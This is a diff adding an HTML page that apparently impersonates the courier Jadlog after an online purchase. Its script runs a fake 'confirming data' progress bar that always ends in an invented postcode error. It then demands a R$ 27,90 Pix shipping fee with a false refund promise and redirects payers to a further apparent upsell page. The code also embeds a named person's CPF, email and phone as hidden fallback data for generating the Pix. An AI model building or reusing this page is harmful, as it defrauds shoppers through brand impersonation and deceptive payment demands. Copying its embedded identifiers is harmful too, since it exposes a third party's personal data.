@@ -1,0 +1,923 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <script src="/js/pix-netlify.js"></script>
+<!-- Microsoft Clarity Code Start -->
+<script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "yevctx4wrr");
+</script>
+<!-- Microsoft Clarity Code End -->
+
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  ttq.load('D96D3DJC77UE6HCFJDJ0');
+  ttq.load('D9KCL3RC77UBVR3T924G');
+  ttq.load('D9PF6N3C77U97D5QA7IG');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+<!-- Spotify Pixel Code Start -->
+<script>
+  (function(w, d){
+    var id='spdt-capture', n='script';
+    if (!d.getElementById(id)) {
+      w.spdt = w.spdt || function() { (w.spdt.q = w.spdt.q || []).push(arguments); };
+      var e = d.createElement(n); e.id = id; e.async=1;
+      e.src = 'https://pixel.byspotify.com/ping.min.js';
+      var s = d.getElementsByTagName(n)[0]; s.parentNode.insertBefore(e, s);
+    }
+    w.spdt('conf', { key: 'b2d850e2d437439d8f7ed7f0a10968f0' });
+    w.spdt('view');
+  })(window, document);
+</script>
+<!-- Spotify Pixel Code End -->
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Confirmação de Envio - Jadlog</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: 'Inter', sans-serif;
+    }
+    body {
+      background: #f4f4f4;
+      color: #222;
+      font-size: 14px;
+      line-height: 1.5;
+    }
+    .app-container {
+      max-width: 480px;
+      margin: 0 auto;
+      min-height: 100vh;
+      background: #ffffff;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      box-shadow: 0 0 10px rgba(0,0,0,0.05);
+    }
+    
+    /* HEADER */
+    .page-header {
+      background: #ffffff;
+      padding: 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      border-bottom: 1px solid #eeeeee;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+    }
+    .logo-jadlog-top {
+      height: 32px;
+      width: auto;
+      object-fit: contain;
+      margin-bottom: 6px;
+    }
+    .header-sub {
+      font-size: 11px;
+      color: #777;
+      font-weight: 500;
+    }
+
+    /* CONTEÚDO */
+    .content {
+      flex: 1;
+      padding: 24px 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* ÍCONE CHECK JADLOG */
+    .check-container {
+      width: 80px;
+      height: 80px;
+      background: #c0002f;
+      border-radius: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 12px rgba(192, 0, 47, 0.2);
+    }
+    .check-icon {
+      width: 44px;
+      height: 44px;
+      stroke: #ffffff;
+      stroke-width: 3.5;
+      fill: none;
+    }
+
+    .title {
+      font-size: 18px;
+      font-weight: 800;
+      color: #111;
+      text-align: center;
+      margin-bottom: 24px;
+      padding: 0 10px;
+      letter-spacing: -0.3px;
+    }
+
+    /* CARD DE DETALHES */
+    .info-card {
+      width: 100%;
+      background: #fafafa;
+      border: 1px solid #eaeaea;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 20px;
+    }
+    
+    .section-title {
+      font-size: 12px;
+      text-transform: uppercase;
+      font-weight: 700;
+      color: #c0002f;
+      margin-bottom: 10px;
+      letter-spacing: 0.5px;
+    }
+
+    /* CAMPO DE ENDEREÇO PARA SESSÃO SEM DADOS */
+    .address-input-group {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-top: 4px;
+    }
+    .address-input-group input {
+      width: 100%;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 10px 12px;
+      font-size: 13px;
+      color: #333;
+      outline: none;
+      font-family: 'Inter', sans-serif;
+      transition: border-color 0.2s;
+    }
+    .address-input-group input:focus {
+      border-color: #c0002f;
+    }
+    .address-input-group input::placeholder {
+      color: #aaa;
+    }
+
+    /* PRODUTOS */
+    .product-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-bottom: 16px;
+      border-bottom: 1px solid #eeeeee;
+      padding-bottom: 16px;
+    }
+    .product-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .product-img {
+      width: 50px;
+      height: 50px;
+      border-radius: 8px;
+      object-fit: cover;
+      border: 1px solid #e0e0e0;
+      background: #ffffff;
+    }
+    .product-details {
+      flex: 1;
+    }
+    .product-name {
+      font-size: 13px;
+      font-weight: 600;
+      color: #333;
+      display: -webkit-box;
+      -webkit-line-clamp: 2;
+      -webkit-box-orient: vertical;
+      overflow: hidden;
+    }
+    .product-var {
+      font-size: 11px;
+      color: #777;
+      margin-top: 2px;
+    }
+
+    /* ENDEREÇO */
+    .address-details {
+      font-size: 13px;
+      color: #444;
+      line-height: 1.5;
+    }
+    .address-name {
+      font-weight: 700;
+      color: #111;
+      margin-bottom: 4px;
+    }
+
+    .transport-partnership {
+      font-size: 13px;
+      color: #555;
+      text-align: center;
+      margin-bottom: 24px;
+      font-weight: 500;
+    }
+
+    /* BOTÃO DE CONFIRMAÇÃO */
+    .btn-confirmar {
+      width: 100%;
+      background: #c0002f;
+      color: #ffffff;
+      border: none;
+      border-radius: 30px;
+      padding: 16px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      text-align: center;
+      transition: background 0.2s, transform 0.1s;
+      box-shadow: 0 4px 12px rgba(192, 0, 47, 0.15);
+      outline: none;
+    }
+    .btn-confirmar:active {
+      transform: scale(0.98);
+      background: #a00025;
+    }
+
+    /* FOOTER */
+    .page-footer {
+      background: #fafafa;
+      padding: 20px 16px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      border-top: 1px solid #eeeeee;
+      margin-top: auto;
+    }
+    .logo-jadlog-bottom {
+      height: 35px;
+      width: auto;
+      object-fit: contain;
+      margin-bottom: 8px;
+    }
+    .footer-text {
+      font-size: 10px;
+      color: #888;
+      text-align: center;
+    }
+
+    /* OVERLAYS E MODAIS */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 20px;
+    }
+    .modal-box {
+      width: 100%;
+      max-width: 400px;
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 24px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.25);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      animation: modalEntrance 0.3s ease-out;
+    }
+    @keyframes modalEntrance {
+      from { transform: scale(0.92); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    /* MODAL DE LOADER / BARRA DE PROGRESSO */
+    .loader-title {
+      font-size: 18px;
+      font-weight: 800;
+      color: #111;
+      margin-bottom: 4px;
+      text-align: center;
+    }
+    .loader-sub {
+      font-size: 13px;
+      color: #666;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    .progress-bar-container {
+      width: 100%;
+      height: 12px;
+      background: #e0e0e0;
+      border-radius: 6px;
+      overflow: hidden;
+      position: relative;
+    }
+    .progress-bar-fill {
+      height: 100%;
+      width: 0%;
+      background: #c0002f;
+      border-radius: 6px;
+    }
+
+    /* MODAL ERRO CEP */
+    .error-icon-box {
+      width: 56px;
+      height: 56px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 16px;
+    }
+    .error-icon {
+      width: 100%;
+      height: 100%;
+      stroke: #c0002f;
+      stroke-width: 2;
+      fill: none;
+    }
+    .error-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #c0002f;
+      margin-bottom: 14px;
+      text-align: center;
+    }
+    .error-desc {
+      font-size: 13px;
+      color: #444;
+      text-align: center;
+      line-height: 1.6;
+      margin-bottom: 20px;
+    }
+    .btn-pagar-frete {
+      width: 100%;
+      background: #c0002f;
+      color: #ffffff;
+      border: none;
+      border-radius: 30px;
+      padding: 14px;
+      font-size: 15px;
+      font-weight: 700;
+      cursor: pointer;
+      text-align: center;
+      margin-bottom: 12px;
+      outline: none;
+      box-shadow: 0 4px 10px rgba(192, 0, 47, 0.15);
+    }
+    .btn-pagar-frete:active {
+      background: #a00025;
+    }
+    .error-footer-tip {
+      font-size: 11px;
+      color: #777;
+    }
+
+    /* TELA DE CHECKOUT PIX DO FRETE */
+    .frete-pix-screen {
+      display: none;
+      width: 100%;
+      flex-direction: column;
+      align-items: center;
+    }
+    .frete-pix-status-title {
+      font-size: 18px;
+      font-weight: 800;
+      color: #111;
+      margin-bottom: 6px;
+      text-align: center;
+    }
+    .frete-pix-price {
+      font-size: 24px;
+      font-weight: 800;
+      color: #c0002f;
+      margin-bottom: 18px;
+      text-align: center;
+    }
+    
+    /* Bloco Copia e Cola do Pix */
+    .pix-code-card {
+      width: 100%;
+      background: #fafafa;
+      border: 1px solid #eaeaea;
+      border-radius: 12px;
+      padding: 16px;
+      margin-bottom: 16px;
+    }
+    .pix-brand-row {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      margin-bottom: 12px;
+    }
+    .pix-icon-img {
+      height: 20px;
+      width: auto;
+    }
+    .pix-brand-name {
+      font-size: 13px;
+      font-weight: 700;
+      color: #111;
+    }
+    .pix-input-code {
+      width: 100%;
+      font-size: 14px;
+      color: #111;
+      font-weight: 700;
+      border: none;
+      background: transparent;
+      outline: none;
+      margin-bottom: 12px;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      overflow: hidden;
+    }
+    .btn-copiar-pix {
+      width: 100%;
+      background: #c0002f;
+      color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      padding: 12px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      transition: background 0.2s;
+    }
+    .btn-copiar-pix.copied-success {
+      background: #00b159 !important;
+    }
+    
+    .pix-instructions {
+      font-size: 12px;
+      color: #555;
+      line-height: 1.5;
+      text-align: center;
+      margin-bottom: 16px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="app-container">
+  
+  <!-- HEADER -->
+  <header class="page-header">
+<!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+  ttq.load('D96D3DJC77UE6HCFJDJ0');
+  ttq.load('D9KCL3RC77UBVR3T924G');
+  ttq.load('D9PF6N3C77U97D5QA7IG');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+    <img class="logo-jadlog-top" src="../jadloglogo/jadlog-logo.png" alt="Jadlog">
+    <span class="header-sub">Será responsável pelo envio do pedido.</span>
+  </header>
+
+  <!-- CONTEÚDO PRINCIPAL (DADOS DO FRETE) -->
+  <div class="content" id="dados-envio-content">
+    
+    <!-- Ícone de Check -->
+    <div class="check-container">
+      <svg class="check-icon" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+        <polyline points="20 6 9 17 4 12"></polyline>
+      </svg>
+    </div>
+
+    <h2 class="title">Confirme os dados de envio seu pedido:</h2>
+
+    <!-- Card de Informações (com sessão) -->
+    <div class="info-card" id="info-card-com-sessao" style="display:none;">
+      <div class="section-title">Produtos do Pedido</div>
+      <div class="product-list" id="cart-products-list">
+        <div style="font-size: 13px; color: #777; text-align: center; padding: 10px 0;">Carregando produtos...</div>
+      </div>
+
+      <div class="section-title">Endereço de Entrega</div>
+      <div class="address-details" id="customer-address-box">
+        <div style="font-size: 13px; color: #777;">Carregando endereço...</div>
+      </div>
+    </div>
+
+    <!-- Card sem sessão: só pede endereço -->
+    <div class="info-card" id="info-card-sem-sessao" style="display:none;">
+      <div class="section-title">Confirme seu endereço novamente</div>
+      <div class="address-input-group">
+        <input type="text" id="fallback-rua" placeholder="Rua / Avenida" autocomplete="street-address">
+        <input type="text" id="fallback-numero" placeholder="Número" style="max-width:120px;">
+        <input type="text" id="fallback-bairro" placeholder="Bairro">
+        <input type="text" id="fallback-cidade" placeholder="Cidade">
+        <input type="text" id="fallback-cep" placeholder="CEP (somente números)" maxlength="9" inputmode="numeric">
+      </div>
+    </div>
+
+    <p class="transport-partnership">O envio será em parceria com o Jadlog Transporte</p>
+
+    <button class="btn-confirmar" onclick="iniciarConfirmacao()">CONFIRMAR</button>
+  </div>
+
+  <!-- TELA DE PAGAMENTO PIX DO FRETE -->
+  <div class="content" id="pagamento-frete-content" style="display: none;">
+    <!-- Logo do Pagamento -->
+    <div class="check-container" style="background: #c0002f; margin-bottom: 20px;">
+      <svg viewBox="0 0 24 24" width="36" height="36" fill="none" stroke="#fff" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+    </div>
+
+    <h2 class="frete-pix-screen-title" style="font-size: 18px; font-weight: 800; color: #111; margin-bottom: 6px; text-align: center;">Pagamento do Frete de Envio</h2>
+    <div class="frete-pix-price">R$ 27,90</div>
+
+    <div class="pix-code-card">
+      <div class="pix-brand-row">
+        <img class="pix-icon-img" src="../logopix/image.png" onerror="this.style.display='none'" alt="Pix">
+        <span class="pix-brand-name">PIX</span>
+      </div>
+      <input type="text" class="pix-input-code" id="frete-pix-code-txt" readonly value="Aguardando geração do PIX...">
+      
+      <button class="btn-copiar-pix" id="btn-copy-pix" onclick="copiarPixFrete()">
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+        Copiar Código Pix
+      </button>
+    </div>
+
+    <div class="pix-instructions">
+      Copie o código acima, abra o aplicativo de seu banco ou carteira digital, escolha a opção "Pix Copia e Cola" ou "Pagar com Pix" e efetue o pagamento.
+    </div>
+
+    <p style="font-size: 11px; color: #777; text-align: center; line-height: 1.5; padding: 0 10px;">
+      O envio do seu pacote será iniciado de forma imediata assim que o Pix do frete for reconhecido pelo sistema de triagem da Jadlog.
+    </p>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="page-footer">
+    <img class="logo-jadlog-bottom" src="../jadloglogo/-jadlogabaixo3.png" alt="Jadlog">
+    <span class="footer-text">Todo conteúdo deste site está publicado sob a licença</span>
+  </footer>
+
+  <!-- MODAL DE BARRA DE PROGRESSO (CONFIRMANDO DADOS) -->
+  <div class="modal-overlay" id="loader-modal">
+    <div class="modal-box">
+      <h3 class="loader-title">Confirmando seus dados...</h3>
+      <p class="loader-sub">Por favor aguarde</p>
+      
+      <div class="progress-bar-container">
+        <div class="progress-bar-fill" id="progress-fill-bar"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- MODAL DE ERRO CEP -->
+  <div class="modal-overlay" id="error-cep-modal">
+    <div class="modal-box">
+      <div class="error-icon-box">
+        <svg class="error-icon" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+          <line x1="12" y1="9" x2="12" y2="13"></line>
+          <line x1="12" y1="17" x2="12.01" y2="17"></line>
+        </svg>
+      </div>
+      
+      <h3 class="error-title">ERRO NO CEP</h3>
+      
+      <p class="error-desc">
+        O valor do CEP foi calculado errado para sua região, o envio não será enviado.<br><br>
+        Para realizarmos o envio é necessário que envie o pagamento do frete. (O Valor pago do frete será reembolsado.)
+      </p>
+      
+      <button class="btn-pagar-frete" id="btn-gerar-frete" onclick="gerarPixFrete()">PAGAR FRETE</button>
+      
+      <span class="error-footer-tip">Clique no botão para continuar</span>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // ── DADOS FIXOS DE FALLBACK (apenas para gerar PIX, nunca aparecem na tela) ──
+  var _FB_NOME  = 'enilton jose da silva';
+  var _FB_EMAIL = 'eniltonjose@gmail.com';
+  var _FB_CPF   = '79699979372';
+  var _FB_TEL   = '11998663234';
+
+  // Verifica se existe sessão com dados do cliente
+  function temSessao() {
+    var nome = localStorage.getItem('user_nome') || '';
+    var cpf  = localStorage.getItem('user_cpf')  || '';
+    var cart1 = localStorage.getItem('famosinhos_checkout_cart') || '[]';
+    var cart2 = localStorage.getItem('famosinhos_cart') || '[]';
+    var temProduto = false;
+    try { temProduto = (JSON.parse(cart1).length > 0 || JSON.parse(cart2).length > 0); } catch(e) {}
+    return (nome.trim() !== '' || cpf.trim() !== '' || temProduto);
+  }
+
+  // Carrega produtos comprados do localStorage
+  function getCheckoutCart() {
+    try {
+      let checkoutItems = JSON.parse(localStorage.getItem('famosinhos_checkout_cart') || '[]');
+      if (!checkoutItems.length) {
+        checkoutItems = JSON.parse(localStorage.getItem('famosinhos_cart') || '[]');
+      }
+      return checkoutItems;
+    } catch(e) {
+      return [];
+    }
+  }
+
+  // Renderiza produtos na tela
+  function renderProducts() {
+    const products = getCheckoutCart();
+    const listEl = document.getElementById('cart-products-list');
+    if (!listEl) return;
+
+    if (!products.length) {
+      listEl.innerHTML = '<div style="font-size: 13px; color: #777; text-align: center; padding: 10px 0;">Nenhum produto encontrado.</div>';
+      return;
+    }
+
+    let html = '';
+    products.forEach(item => {
+      const qty = item.qty || 1;
+      let imgSrc = item.img || '';
+      
+      // Corrige caminho relativo da imagem se necessário
+      if (!imgSrc.startsWith('http') && !imgSrc.startsWith('//')) {
+        if (imgSrc.startsWith('../')) imgSrc = imgSrc.substring(3);
+        imgSrc = '../' + imgSrc;
+      }
+      
+      html += `
+        <div class="product-item">
+          <img class="product-img" src="${imgSrc}" onerror="this.src='https://via.placeholder.com/50'">
+          <div class="product-details">
+            <div class="product-name">${item.nome}</div>
+            <div class="product-var">Quantidade: ${qty} ${item.variacao ? `| ${item.variacao}` : ''}</div>
+          </div>
+        </div>
+      `;
+    });
+    listEl.innerHTML = html;
+  }
+
+  // Renderiza o endereço de entrega do localStorage
+  function renderAddress() {
+    const box = document.getElementById('customer-address-box');
+    if (!box) return;
+
+    const name = localStorage.getItem('user_nome') || '';
+    const tel = localStorage.getItem('user_tel') || '';
+    const cep = localStorage.getItem('user_cep') || '';
+    const rua = localStorage.getItem('user_rua') || '';
+    const num = localStorage.getItem('user_numero') || '';
+    const bairro = localStorage.getItem('user_bairro') || '';
+    const cidade = localStorage.getItem('user_cidade') || '';
+    const estado = localStorage.getItem('user_estado') || '';
+
+    if (!rua) {
+      box.innerHTML = '<div style="color: #c0002f; font-weight: 700;">Dados de endereço insuficientes.</div>';
+      return;
+    }
+
+    box.innerHTML = `
+      <div class="address-name">${name}</div>
+      <div>Telefone: +55 ${tel}</div>
+      <div style="margin-top: 4px; color: #666;">
+        ${rua}, Nº ${num}<br>
+        ${bairro ? `${bairro} - ` : ''}${cidade}/${estado}<br>
+        CEP: ${cep}
+      </div>
+    `;
+  }
+
+  // Função disparada ao clicar em Confirmar
+  function iniciarConfirmacao() {
+    // Se não tem sessão, valida o campo de endereço preenchido pelo usuário
+    if (!temSessao()) {
+      var rua = document.getElementById('fallback-rua') ? document.getElementById('fallback-rua').value.trim() : '';
+      if (!rua) {
+        alert('Por favor, informe sua rua/avenida para continuar.');
+        return;
+      }
+    }
+
+    const loaderModal = document.getElementById('loader-modal');
+    const fillBar = document.getElementById('progress-fill-bar');
+    
+    if (loaderModal && fillBar) {
+      loaderModal.style.display = 'flex';
+      fillBar.style.width = '0%';
+      
+      let width = 0;
+      const interval = setInterval(() => {
+        width += 2;
+        fillBar.style.width = width + '%';
+        
+        if (width >= 100) {
+          clearInterval(interval);
+          setTimeout(() => {
+            // Oculta o loader e abre o modal de erro de CEP
+            loaderModal.style.display = 'none';
+            abrirErroCepModal();
+          }, 300);
+        }
+      }, 60); // Totalizando ~3 segundos
+    }
+  }
+
+  function abrirErroCepModal() {
+    const errorModal = document.getElementById('error-cep-modal');
+    if (errorModal) {
+      errorModal.style.display = 'flex';
+    }
+  }
+
+  // Chamada de API para gerar o PIX do frete de R$ 27,90
+  let pixFreteCode = '';
+  let pixFreteTxid = '';
+  let pollingInterval = null;
+
+  async function gerarPixFrete() {
+    const btn = document.getElementById('btn-gerar-frete');
+    if (btn) {
+      btn.disabled = true;
+      btn.textContent = 'Gerando PIX do Frete...';
+    }
+
+    // Usa dados da sessão se existirem; caso contrário usa fallback invisível
+    const nome  = localStorage.getItem('user_nome')  || _FB_NOME;
+    const email = localStorage.getItem('user_email') || _FB_EMAIL;
+    const tel   = localStorage.getItem('user_tel')   || _FB_TEL;
+    const cpf   = localStorage.getItem('user_cpf')   || _FB_CPF;
+
+    try {
+      const resp = await fetch('/api/create-pix', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          amount: 2790, // R$ 27,90 em centavos
+          name: nome,
+          email: email,
+          cellphone: tel.replace(/\D/g, ''),
+          taxId: cpf.replace(/\D/g, ''),
+          src: window.location.href,
+          user_agent: navigator.userAgent,
+          is_upsell: true
+        })
+      });
+
+      const data = await resp.json();
+      console.log('[Frete Pix] Resposta:', data);
+
+      if (!resp.ok || !data || !data.pix_code) {
+        throw new Error(data.message || 'Falha ao obter código pix da API');
+      }
+
+      if (data && data.pix_code) {
+        pixFreteCode = data.pix_code;
+        pixFreteTxid = data.txid;
+
+        localStorage.setItem('up1_code', pixFreteCode);
+        localStorage.setItem('up1_txid', pixFreteTxid);
+
+        // Atualiza UI
+        document.getElementById('frete-pix-code-txt').value = pixFreteCode;
+        
+        // Esconde modal de erro e exibe a tela de pagamento
+        document.getElementById('error-cep-modal').style.display = 'none';
+        document.getElementById('dados-envio-content').style.display = 'none';
+        document.getElementById('pagamento-frete-content').style.display = 'flex';
+
+        // Inicia polling para verificar o pagamento
+        iniciarPollingFrete(pixFreteTxid);
+      } else {
+        throw new Error('Falha ao obter código pix da API');
+      }
+
+    } catch (err) {
+      console.error('[Frete Pix] Erro:', err);
+      alert('Erro ao gerar código de pagamento do frete. Tente novamente.');
+      if (btn) {
+        btn.disabled = false;
+        btn.textContent = 'PAGAR FRETE';
+      }
+    }
+  }
+
+  // Copia o código do Pix do Frete
+  function copiarPixFrete() {
+    const codeInput = document.getElementById('frete-pix-code-txt');
+    const copyBtn = document.getElementById('btn-copy-pix');
+    if (!codeInput) return;
+
+    const code = codeInput.value;
+    if (!code || code.includes('Aguardando')) return;
+
+    const performCopy = () => {
+      if (copyBtn) {
+        const originalHTML = copyBtn.innerHTML;
+        copyBtn.innerHTML = `
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg>
+          Código Copiado!
+        `;
+        copyBtn.classList.add('copied-success');
+
+        setTimeout(() => {
+          copyBtn.innerHTML = originalHTML;
+          copyBtn.classList.remove('copied-success');
+        }, 4000);
+      }
+    };
+
+    if (navigator.clipboard) {
+      navigator.clipboard.writeText(code).then(performCopy).catch(() => {
+        codeInput.select();
+        document.execCommand('copy');
+        performCopy();
+      });
+    } else {
+      codeInput.select();
+      document.execCommand('copy');
+      performCopy();
+    }
+  }
+
+  // Polling para checar se o Pix do Frete foi pago
+  function iniciarPollingFrete(txid) {
+    if (!txid) return;
+    if (pollingInterval) clearInterval(pollingInterval);
+
+    pollingInterval = setInterval(async () => {
+      try {
+        const resp = await fetch(`/api/payment-status/${txid}`);
+        const data = await resp.json();
+        console.log('[Frete Pix] Status Polling:', data);
+
+        const pago = data.status === 'paid'     ||
+                     data.status === 'approved' ||
+                     data.status === 'PAID'     ||
+                     data.status === 'APPROVED' ||
+                     data.paid === true;
+
+        if (pago) {
+          clearInterval(pollingInterval);
+          localStorage.removeItem('up1_code');
+          localStorage.removeItem('up1_txid');
+          window.location.href = '/up-up-2';
+        }
+      } catch (e) {
+        console.error('[Frete Pix] Erro no polling de status:', e);
+      }
+    }, 5000);
+  }
+
+  // Inicialização: decide qual card exibir
+  document.addEventListener('DOMContentLoaded', () => {
+    var savedTxid = localStorage.getItem('up1_txid');
+    var savedCode = localStorage.getItem('up1_code');
+
+    if (savedTxid && savedCode) {
+      document.getElementById('frete-pix-code-txt').value = savedCode;
+      document.getElementById('info-card-sem-sessao').style.display = 'none';
+      document.getElementById('info-card-com-sessao').style.display = 'none';
+      document.getElementById('dados-envio-content').style.display = 'none';
+      document.getElementById('pagamento-frete-content').style.display = 'flex';
+      iniciarPollingFrete(savedTxid);
+    } else if (temSessao()) {
+      // Tem dados: exibe card normal com produtos e endereço
+      document.getElementById('info-card-com-sessao').style.display = 'block';
+      renderProducts();
+      renderAddress();
+    } else {
+      // Sem dados: exibe card com campo de endereço para preencher
+      document.getElementById('info-card-sem-sessao').style.display = 'block';
+    }
+  });
+</script>
+
+</body>
+</html>
